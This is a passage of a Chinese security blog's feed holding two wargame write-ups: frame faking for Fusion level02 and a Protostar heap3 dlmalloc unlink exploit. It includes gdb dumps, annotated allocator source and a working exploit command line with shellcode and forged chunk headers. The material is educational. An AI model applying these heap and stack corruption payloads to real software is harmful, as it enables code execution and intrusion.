<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(gdb) ni</span><br><span class="line"><span class="number">0x0804844b</span> <span class="keyword">in</span> t ()</span><br><span class="line">(gdb) i r</span><br><span class="line"><span class="literal">eax</span>            <span class="number">0x121</span>	<span class="number">289</span></span><br><span class="line"><span class="literal">ecx</span>            <span class="number">0xbffff51c</span>	-<span class="number">1073744612</span></span><br><span class="line"><span class="literal">edx</span>            <span class="number">0x0</span>	<span class="number">0</span></span><br><span class="line"><span class="literal">ebx</span>            <span class="number">0xb7fceff4</span>	-<span class="number">1208160268</span></span><br><span class="line"><span class="literal">esp</span>            <span class="number">0xbffff650</span>	<span class="number">0xbffff650</span></span><br><span class="line"><span class="literal">ebp</span>            <span class="number">0x41414141</span>	<span class="number">0x41414141</span></span><br><span class="line"><span class="literal">esi</span>            <span class="number">0x0</span>	<span class="number">0</span></span><br><span class="line"><span class="literal">edi</span>            <span class="number">0x0</span>	<span class="number">0</span></span><br><span class="line"><span class="literal">eip</span>            <span class="number">0x804844b</span>	<span class="number">0x804844b</span> &lt;t&gt;</span><br><span class="line">eflags         <span class="number">0x296</span>	[ PF AF SF IF ]</span><br><span class="line"><span class="literal">cs</span>             <span class="number">0x73</span>	<span class="number">115</span></span><br><span class="line"><span class="literal">ss</span>             <span class="number">0x7b</span>	<span class="number">123</span></span><br><span class="line"><span class="literal">ds</span>             <span class="number">0x7b</span>	<span class="number">123</span></span><br><span class="line"><span class="literal">es</span>             <span class="number">0x7b</span>	<span class="number">123</span></span><br><span class="line"><span class="literal">fs</span>             <span class="number">0x0</span>	<span class="number">0</span></span><br><span class="line"><span class="literal">gs</span>             <span class="number">0x33</span>	<span class="number">51</span></span><br></pre></td></tr></table></figure>
<p>步进之后果然进入了t函数。查看t函数的汇编代码。</p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas t</span><br><span class="line">Dump <span class="keyword">of</span> assembler code <span class="keyword">for</span> <span class="keyword">function</span> t:</span><br><span class="line">=&gt; <span class="number">0x0804844b</span> &lt;+<span class="number">0</span>&gt;:	push   <span class="decorator">%ebp</span></span><br><span class="line">   <span class="number">0x0804844c</span> &lt;+<span class="number">1</span>&gt;:	mov    <span class="decorator">%esp</span>,<span class="decorator">%ebp</span></span><br><span class="line">   <span class="number">0x0804844e</span> &lt;+<span class="number">3</span>&gt;:	sub    <span class="variable">$0x28</span>,<span class="decorator">%esp</span></span><br><span class="line">   <span class="number">0x08048451</span> &lt;+<span class="number">6</span>&gt;:	movl   <span class="variable">$0x0</span>,-<span class="number">0xc</span>(<span class="decorator">%ebp</span>)</span><br><span class="line">   <span class="number">0x08048458</span> &lt;+<span class="number">13</span>&gt;:	addl   <span class="variable">$0x1</span>,-<span class="number">0xc</span>(<span class="decorator">%ebp</span>)</span><br><span class="line">   <span class="number">0x0804845c</span> &lt;+<span class="number">17</span>&gt;:	mov    <span class="variable">$0x804857c</span>,<span class="decorator">%eax</span></span><br><span class="line">   <span class="number">0x08048461</span> &lt;+<span class="number">22</span>&gt;:	mov    -<span class="number">0xc</span>(<span class="decorator">%ebp</span>),<span class="decorator">%edx</span></span><br><span class="line">   <span class="number">0x08048464</span> &lt;+<span class="number">25</span>&gt;:	mov    <span class="decorator">%edx</span>,<span class="number">0x4</span>(<span class="decorator">%esp</span>)</span><br><span class="line">   <span class="number">0x08048468</span> &lt;+<span class="number">29</span>&gt;:	mov    <span class="decorator">%eax</span>,(<span class="decorator">%esp</span>)</span><br><span class="line">   <span class="number">0x0804846b</span> &lt;+<span class="number">32</span>&gt;:	call   <span class="number">0x8048320</span> &lt;printf@plt&gt;</span><br><span class="line">   <span class="number">0x08048470</span> &lt;+<span class="number">37</span>&gt;:	leave  </span><br><span class="line">   <span class="number">0x08048471</span> &lt;+<span class="number">38</span>&gt;:	ret    </span><br><span class="line">End <span class="keyword">of</span> assembler dump.</span><br></pre></td></tr></table></figure>
<p>此时ebp为0x41414141。esp为0xbffff650,该地址的内存中存储的值为CCCC。</p>
<p>所以在代码执行t函数的栈空间构造完成之后。</p>
<table>
<thead>
<tr>
<th style="text-align:right">寄存器</th>
<th style="text-align:left">值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:right">[0xbffff64c]ebp====&gt;</td>
<td style="text-align:left">0x41414141</td>
</tr>
<tr>
<td style="text-align:right"></td>
<td style="text-align:left">0x43434343</td>
</tr>
<tr>
<td style="text-align:right"></td>
<td style="text-align:left">…..</td>
</tr>
<tr>
<td style="text-align:right"></td>
<td style="text-align:left">…..</td>
</tr>
<tr>
<td style="text-align:right">[0xbffff624]esp====&gt;</td>
<td style="text-align:left">0x0804857c[这个值是什么不重要]</td>
</tr>
</tbody>
</table>
<p>在leave执行之后。</p>
<table>
<thead>
<tr>
<th style="text-align:right">寄存器</th>
<th>值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:right"></td>
<td>0x41414141</td>
</tr>
<tr>
<td style="text-align:right">[0xbffff650]esp====&gt;</td>
<td>0x43434343</td>
</tr>
<tr>
<td style="text-align:right"></td>
<td>…</td>
</tr>
<tr>
<td style="text-align:right"></td>
<td>…</td>
</tr>
<tr>
<td style="text-align:right"></td>
<td>…</td>
</tr>
<tr>
<td style="text-align:right"></td>
<td>…</td>
</tr>
<tr>
<td style="text-align:right"></td>
<td>…</td>
</tr>
<tr>
<td style="text-align:right">[0x41414141]ebp====&gt;</td>
<td>不关心是什么东西…………………………..</td>
</tr>
</tbody>
</table>
<p>再执行ret。其实就是pop esi,那么esi就指向了esp当前指向的0x43434343。</p>
<p>那么同理，函数的参数其实就很好理解了。</p>
<h2 id="缺点与不足">缺点与不足</h2><p>这种溢出技巧有两个缺点：</p>
<ol>
<li>不能很好的支持连续调用多个函数，因为每个函数需要的参数可能不同。</li>
<li>不能支持参数中出现null字符。</li>
</ol>
<p>所以我们需要引入一个高级一些的技巧：）。</p>
<h1 id="0x02_frame_faking"><strong>0x02</strong> frame faking</h1><h2 id="原理介绍">原理介绍</h2><p>frame faking并不是通过覆盖ret地址为目标函数来控制eip，而是通过覆盖ebp与eip协同来控制程序的进程。</p>
<p>首先给出frame faking技巧使用时栈上的内存分布，之后在做详细的分步解释。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/frame-faking-栈上数据图.png" alt="stack status"></p>
<p>如图所示，给出的payload中做了两件事情。</p>
<ol>
<li><p>用一个<strong>伪造的EBP地址</strong>来<strong>覆盖</strong>原来的<strong>真实的EBP地址</strong>。</p>
</li>
<li><p>用一个指向汇编代码<strong>leave/ret</strong>的地址覆盖原来的返回地址。这么一来在原本程序结束前调用函数中原本存在的leave/ret指令之后，会再一次执行leave/ret指令。相当于做了两次leave/ret。可以变向的理解为<strong>被攻击的函数</strong>结束时的汇编代码为。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">mov ebp, esp</span><br><span class="line">sub esp, <span class="number">0x96</span> </span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">mov esp,ebp			;<span class="comment">//</span></span><br><span class="line">pop ebp				;<span class="comment">// leave</span></span><br><span class="line"></span><br><span class="line">pop esi				;<span class="comment">// ret</span></span><br><span class="line"></span><br><span class="line">mov esp,ebp			;<span class="comment">//</span></span><br><span class="line">pop ebp				;<span class="comment">// leave</span></span><br><span class="line"></span><br><span class="line">pop esi				;<span class="comment">// ret</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>现在对两次leave/ret做出拆分图解，一共6条汇编指令。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/frame-faking-leave1-mov_esp_ebp.png" alt="leave_1_mov_esp_ebp"></p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/frame-faking-leave1-pop_ebp.png" alt="leave_1_pop_ebp"></p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/frame-faking-ret1-pop_eip.png" alt="ret_1_pop_eip"></p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/frame-faking-leave2-mov_esp_ebp.png" alt="leave_2_mov_esp_ebp"></p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/frame-faking-leave2-pop_ebp.png" alt="leave_2_pop_ebp"></p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/frame-faking-ret2-pop_eip.png" alt="ret_2_pop_eip"></p>
<p>通过这一系列的调用，完成了程序运行流程的控制，在解决fusion的level02的时候使用这个技巧可以使解题变的简单很多。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_frame-faking"><strong>0x00</strong>  frame-faking</h1><p>在处理<a href="https://exploit-exercises.com/fusion/">fusion</a>的<a href="https://exploit-exercises.com/fusion/level02/">level02</a>时遇到新的问题，需要了解frame-faking的原理，查阅了一些资料。</p>
<p><a href="http://phrack.org/issues/58/4.html">The advanced return-into-lib(c) exploits</a></p>
<p><a href="http://www.xfocus.net/articles/200602/851.html">Advanced Exploit Techique之–frame faking技术</a></p>
<p><a href="http://www.slideshare.net/hackstuff/rop-40525248">ROP轻松谈</a></p>
<p>首先感谢各位前辈写的文章。</p>
<p>Frame Faking是一种栈溢出的技巧，使用framefaking可以通过控制ebp修改程序的运行流程，可以用来对抗DEP。</p>
<h2 id="<!-more->">]]>
    
    </summary>
    
      <category term="exploit" scheme="http://yoursite.com/tags/exploit/"/>
    
      <category term="stack" scheme="http://yoursite.com/tags/stack/"/>
    
      <category term="fusion" scheme="http://yoursite.com/categories/fusion/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[protostar详细解析 heap3-通过heap3理解堆腐坏的原理及利用方法]]></title>
    <link href="http://yoursite.com/2015/12/14/protostar-heap3/"/>
    <id>http://yoursite.com/2015/12/14/protostar-heap3/</id>
    <published>2015-12-14T20:57:02.000Z</published>
    <updated>2016-03-24T03:38:34.000Z</updated>
    <content type="html"><![CDATA[<h1 id="1_源码">1 源码</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">winner</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"that wasn't too bad now, was it? @ %d\n"</span>, time(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *a, *b, *c;</span><br><span class="line"></span><br><span class="line">  a = <span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line">  b = <span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line">  c = <span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(a, argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">strcpy</span>(b, argv[<span class="number">2</span>]);</span><br><span class="line">  <span class="built_in">strcpy</span>(c, argv[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(c);</span><br><span class="line">  <span class="built_in">free</span>(b);</span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"dynamite failed?\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="2_基础知识">2 基础知识</h1><p>​    1.DWORDSHOOT</p>
<p>​        需要了解DWORDSHOOT基本原理，heap3最后是使用了free时触发unlink来实现任意地址修        改，实现控制程序执行流程的。DWORDSHOOT的原理，再另外一篇文章中已经有比较详细的介绍了。</p>
<p>​        <a href="http://BLOGIMAGE/2015/12/12/%E5%9B%BE%E8%A7%A3dwordshoot/" target="_blank" rel="external">DWORDSHOOT</a></p>
<p>​    2.DLMALLOC</p>
<p>​        了解malloc库的基本原理，从而明白如何通过free来触发unlink从而完成溢出。</p>
<p>​        <a href="https://github.com/turingH/exploit/blob/master/dlmalloc/malloc.c" target="_blank" rel="external">malloc.c[翻译中]</a>空闲时间会持续翻译。</p>
<p>​        <a href="http://gee.cs.oswego.edu/dl/html/malloc.html" target="_blank" rel="external">dlmalloc</a>作者自己写的文章。其中与我们特别相关的是free算法于bins。这里先简单介绍一下bins。</p>
<p>​        <img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/heap3_bins.png" alt="bins结构图"></p>
<h1 id="3_调试">3 调试</h1><p>​    使用gdb查看汇编代码。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb$ disas main&#10;Dump of assembler code for function main:&#10;0x08048889 &#60;main+0&#62;:&#9;push   ebp&#10;0x0804888a &#60;main+1&#62;:&#9;mov    ebp,esp&#10;0x0804888c &#60;main+3&#62;:&#9;and    esp,0xfffffff0&#10;0x0804888f &#60;main+6&#62;:&#9;sub    esp,0x20&#10;0x08048892 &#60;main+9&#62;:&#9;mov    DWORD PTR [esp],0x20&#10;0x08048899 &#60;main+16&#62;:&#9;call   0x8048ff2 &#60;malloc&#62;&#10;0x0804889e &#60;main+21&#62;:&#9;mov    DWORD PTR [esp+0x14],eax&#10;0x080488a2 &#60;main+25&#62;:&#9;mov    DWORD PTR [esp],0x20&#10;0x080488a9 &#60;main+32&#62;:&#9;call   0x8048ff2 &#60;malloc&#62;&#10;0x080488ae &#60;main+37&#62;:&#9;mov    DWORD PTR [esp+0x18],eax&#10;0x080488b2 &#60;main+41&#62;:&#9;mov    DWORD PTR [esp],0x20&#10;0x080488b9 &#60;main+48&#62;:&#9;call   0x8048ff2 &#60;malloc&#62;&#10;0x080488be &#60;main+53&#62;:&#9;mov    DWORD PTR [esp+0x1c],eax&#10;0x080488c2 &#60;main+57&#62;:&#9;mov    eax,DWORD PTR [ebp+0xc]&#10;0x080488c5 &#60;main+60&#62;:&#9;add    eax,0x4&#10;0x080488c8 &#60;main+63&#62;:&#9;mov    eax,DWORD PTR [eax]&#10;0x080488ca &#60;main+65&#62;:&#9;mov    DWORD PTR [esp+0x4],eax&#10;0x080488ce &#60;main+69&#62;:&#9;mov    eax,DWORD PTR [esp+0x14]&#10;0x080488d2 &#60;main+73&#62;:&#9;mov    DWORD PTR [esp],eax&#10;0x080488d5 &#60;main+76&#62;:&#9;call   0x8048750 &#60;strcpy@plt&#62;&#10;0x080488da &#60;main+81&#62;:&#9;mov    eax,DWORD PTR [ebp+0xc]&#10;0x080488dd &#60;main+84&#62;:&#9;add    eax,0x8&#10;0x080488e0 &#60;main+87&#62;:&#9;mov    eax,DWORD PTR [eax]&#10;0x080488e2 &#60;main+89&#62;:&#9;mov    DWORD PTR [esp+0x4],eax&#10;0x080488e6 &#60;main+93&#62;:&#9;mov    eax,DWORD PTR [esp+0x18]&#10;0x080488ea &#60;main+97&#62;:&#9;mov    DWORD PTR [esp],eax&#10;0x080488ed &#60;main+100&#62;:&#9;call   0x8048750 &#60;strcpy@plt&#62;&#10;0x080488f2 &#60;main+105&#62;:&#9;mov    eax,DWORD PTR [ebp+0xc]&#10;0x080488f5 &#60;main+108&#62;:&#9;add    eax,0xc&#10;0x080488f8 &#60;main+111&#62;:&#9;mov    eax,DWORD PTR [eax]&#10;0x080488fa &#60;main+113&#62;:&#9;mov    DWORD PTR [esp+0x4],eax&#10;0x080488fe &#60;main+117&#62;:&#9;mov    eax,DWORD PTR [esp+0x1c]&#10;0x08048902 &#60;main+121&#62;:&#9;mov    DWORD PTR [esp],eax&#10;0x08048905 &#60;main+124&#62;:&#9;call   0x8048750 &#60;strcpy@plt&#62;&#10;0x0804890a &#60;main+129&#62;:&#9;mov    eax,DWORD PTR [esp+0x1c]&#10;0x0804890e &#60;main+133&#62;:&#9;mov    DWORD PTR [esp],eax&#10;0x08048911 &#60;main+136&#62;:&#9;call   0x8049824 &#60;free&#62;&#10;0x08048916 &#60;main+141&#62;:&#9;mov    eax,DWORD PTR [esp+0x18]&#10;0x0804891a &#60;main+145&#62;:&#9;mov    DWORD PTR [esp],eax&#10;0x0804891d &#60;main+148&#62;:&#9;call   0x8049824 &#60;free&#62;&#10;0x08048922 &#60;main+153&#62;:&#9;mov    eax,DWORD PTR [esp+0x14]&#10;0x08048926 &#60;main+157&#62;:&#9;mov    DWORD PTR [esp],eax&#10;0x08048929 &#60;main+160&#62;:&#9;call   0x8049824 &#60;free&#62;&#10;0x0804892e &#60;main+165&#62;:&#9;mov    DWORD PTR [esp],0x804ac27&#10;0x08048935 &#60;main+172&#62;:&#9;call   0x8048790 &#60;puts@plt&#62;&#10;0x0804893a &#60;main+177&#62;:&#9;leave  &#10;0x0804893b &#60;main+178&#62;:&#9;ret</span><br></pre></td></tr></table></figure>
<p>在第一个free和ret之前分别下断点，观察堆上数据。具体如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/heap3_heapstat.png" alt="Image text"></p>
<p>现在我们去分析<a href="https://github.com/turingH/exploit/blob/master/dlmalloc/malloc.c" target="_blank" rel="external">malloc.c</a>源码的free部分。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dlfree</span><span class="params">(<span class="keyword">void</span>* mem)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/*</span><br><span class="line">     Consolidate freed chunks with preceeding or succeeding bordering</span><br><span class="line">     free chunks, if they exist, and then place in a bin.  Intermixed</span><br><span class="line">     with special cases for top, dv, mmapped chunks, and usage errors.</span><br><span class="line">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem != <span class="number">0</span>) &#123;</span><br><span class="line">    mchunkptr p  = mem2chunk(mem); <span class="comment">//将user使用的内存地址转化为chunk所指向的地址。</span></span><br><span class="line">	</span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> FOOTERS</span></span><br><span class="line">    mstate fm = get_mstate_for(p);</span><br><span class="line">    <span class="keyword">if</span> (!ok_magic(fm)) &#123;</span><br><span class="line">      USAGE_ERROR_ACTION(fm, p);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">else</span> <span class="comment">/* FOOTERS */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> fm gm</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span> <span class="comment">/* FOOTERS */</span></span></span><br><span class="line">    <span class="keyword">if</span> (!PREACTION(fm)) &#123;</span><br><span class="line">      </span><br><span class="line">	  check_inuse_chunk(fm, p);	</span><br><span class="line">	  <span class="comment">//所有相关字段的检测，与主题逻辑无关。</span></span><br><span class="line">      </span><br><span class="line">	  <span class="keyword">if</span> (RTCHECK(ok_address(fm, p) &amp;&amp; ok_inuse(p))) &#123; </span><br><span class="line">		<span class="comment">//检测地址与内存使用状态是否合法。</span></span><br><span class="line">        </span><br><span class="line">		<span class="keyword">size_t</span> psize = chunksize(p);</span><br><span class="line">		<span class="comment">//通过p-&gt;head计算chunk的长度。</span></span><br><span class="line">		</span><br><span class="line">        mchunkptr next = chunk_plus_offset(p, psize);</span><br><span class="line">		<span class="comment">//通过p指针与求得的size计算nextchunk。</span></span><br><span class="line">       </span><br><span class="line">		<span class="keyword">if</span> (!pinuse(p)) &#123;</span><br><span class="line">			<span class="comment">//如果内存块正没有被使用。</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">size_t</span> prevsize = p-&gt;prev_foot;</span><br><span class="line">		  <span class="comment">// 获取前一个chunk块的长度。</span></span><br><span class="line"></span><br><span class="line">		  <span class="comment">/*这一段是mapped可不看--------start-------*/</span></span><br><span class="line">          <span class="keyword">if</span> (is_mmapped(p)) &#123;</span><br><span class="line">            psize += prevsize + MMAP_FOOT_PAD;</span><br><span class="line">            <span class="keyword">if</span> (CALL_MUNMAP((<span class="keyword">char</span>*)p - prevsize, psize) == <span class="number">0</span>)</span><br><span class="line">              fm-&gt;footprint -= psize;</span><br><span class="line">            <span class="keyword">goto</span> postaction;</span><br><span class="line">          &#125;</span><br><span class="line">		  <span class="comment">/*这一段是mapped可不看--------end-------*/</span></span><br><span class="line">          <span class="keyword">else</span> &#123;</span><br><span class="line">			  <span class="comment">//内存快不是mapped分配的</span></span><br><span class="line">            mchunkptr prev = chunk_minus_offset(p, prevsize);</span><br><span class="line">			<span class="comment">//chunk指针减去前一个chunk的长度获得前一个chunk的开始地址</span></span><br><span class="line">            psize += prevsize;</span><br><span class="line">            p = prev;</span><br><span class="line">			<span class="comment">//重新计算chunk长度，将指针指向前一个chunk开始的地方。</span></span><br><span class="line">            <span class="keyword">if</span> (RTCHECK(ok_address(fm, prev))) &#123; <span class="comment">/* consolidate backward */</span></span><br><span class="line">              <span class="keyword">if</span> (p != fm-&gt;dv) &#123;</span><br><span class="line">				  <span class="comment">//核心关键，进入了unlink流程。将修改后的p从双向链表中unlink下来。</span></span><br><span class="line">                unlink_chunk(fm, p, prevsize);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span> <span class="keyword">if</span> ((next-&gt;head &amp; INUSE_BITS) == INUSE_BITS) &#123;</span><br><span class="line">                fm-&gt;dvsize = psize;</span><br><span class="line">                set_free_with_pinuse(p, psize, next);</span><br><span class="line">                <span class="keyword">goto</span> postaction;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              <span class="keyword">goto</span> erroraction;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">       ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据源码，简单的流程如下图所示。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/heap3_free_alg.png" alt="free简易流程图"></p>
<p>那么正常情况下free(c)代码执行时，对流程的分析如下图所示。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/heap3_normal.png" alt="正常情况下的free(c)"></p>
<p>而在对输入的参数精心构筑之后溢出后的流程分析如下图所示。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/heap3_exploit.png" alt="溢出后的free(c)"></p>
<p>所以此题的答案也就出来了。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:/tmp$ ./bin/heap3 `python -c "print '\x90'*10 + '\x68\x64\x88\x04\x08\xc3'"` `python -c "print 'A'*32 + '\xfc\xff\xff\xff'*2 + 'CCCC' + '\x1c\xb1\x04\x08' + '\x04\xc0\x04\x08' "` F</span><br><span class="line">that wasn't too bad now, was it? @ 1449484612</span><br></pre></td></tr></table></figure>
<p>具体的shellcode地址，<a href="http://BLOGIMAGE/2015/12/12/%E5%9B%BE%E8%A7%A3dwordshoot/" target="_blank" rel="external">DWORDSHOOT</a>如何构建，再之前的基础学习之后应该不需要想家复述，如有不明看<a href="http://turingh.github.io/2015/12/12/%E5%9B%BE%E8%A7%A3dwordshoot/" target="_blank" rel="external">这里</a>。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="1_源码">1 源码</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">winner</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"that wasn't too bad now, was it? @ %d\n"</span>, time(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *a, *b, *c;</span><br><span class="line"></span><br><span class="line">  a = <span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line">  b = <span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line">  c = <span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(a, argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">strcpy</span>(b, argv[<span class="number">2</span>]);</span><br><span 